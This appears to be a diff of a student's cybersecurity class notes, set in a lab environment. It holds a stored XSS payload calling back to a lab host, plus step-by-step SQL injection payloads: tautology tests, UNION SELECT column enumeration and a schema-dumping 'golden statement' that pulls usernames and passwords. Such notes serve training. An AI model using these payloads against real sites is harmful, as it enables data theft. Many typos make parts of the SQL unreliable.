@@ -36,4 +36,41 @@ http://10.50.28.11/robots.txt
 #Robots.txt, Then legit surf, then use NSE scripts, Finally use Nikto
 #Stored XSS Example 
 <img src="http://invalid" onerror="window.open('http://10.50.XX.XX:8000/ram.png','xss','height=1,width=1');">
+-------------------------------------------------------------DAY3 SQL------------------------------
+### SQL NAVIGATION DEMO ###
+#Access SQL database
+mysql
+#find SQL databases
+show database ;
+#information_schema contains info about other databases
+use information_schema
+#Find tables within is
+show tables ; 
+#Show the coloums witin the coloums table 
+show coloums from coloums;
+  TABLE_SCHEMA
+  TABLE_NAME
+  COLUMN_NAME
+#Show databases, tables, and colunms                 (database)      (table)
+select table_schema,table_name,coloumn_name from information_schema.columns ;
+#grab colunms from table userinfo
+select username,passwd,sudentID from session.userinfo ;
+#grab colunms from table car
+select name,cost,color from session.car ;
+###-------------------###
+#Single quote to check sor SQL injection
+#Check for field santitzion
+'OR 1=' 1
+#Using Web Tools view post request Raw, copy the string into the url after the ?
+###FOR SQL POST 
+#Identify Vulnerable Field by adding 'OR 1='1 to the end of the valid feilds 
+#use UNION SELECT to identify number of colunms
+Audi 'UNION SELECT 1,2,3,4,5#  
+    -4 colunms displayes coloumn 2 is hidden
+## GOLDEN STATEMENT
+Audi 'UNION SELECT table_schema,table_name,colunm_name from information_schema.columns #
+#edit golden statement for hidden columns and total columns 
+Audi 'UNION SELECT table_schema,2,table_name,column_name,5 from information_schema.columns #
+#edit statement to show contents of columns
+Audi 'UNION SELECT type,2,cost,color,year from session.car #
 
